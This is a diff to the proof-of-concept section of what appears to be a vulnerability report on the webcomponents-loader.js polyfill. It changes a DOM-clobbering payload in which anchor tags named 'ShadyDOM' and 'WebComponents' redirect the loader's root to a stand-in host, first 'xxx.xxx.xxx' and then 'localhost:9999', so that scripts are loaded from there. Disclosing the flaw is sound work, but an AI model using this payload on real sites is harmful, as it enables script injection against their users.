@@ -55,20 +55,15 @@ if (polyfills.length) {
 ## PoC
 
 ```html
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Polyfills Example</title>
-</head>
+<!--Library-->
+<script src="./webcomponents-loader.js"></script>
+<!--Library-->
 
+<!--Payload-->
 <a id="ShadyDOM"></a>
 <a id="ShadyDOM" name="force"></a>
 <a id="WebComponents"></a>
-<a id="WebComponents" name="root" href="https://xxx.xxx.xxx"></a>
-
-<script src="./webcomponents-loader.js"></script>
-
-<body>
-</body>
-</html>
+<a id="WebComponents" name="root" href="http://localhost:9999"></a>
+<!--Payload-->
 ```
+
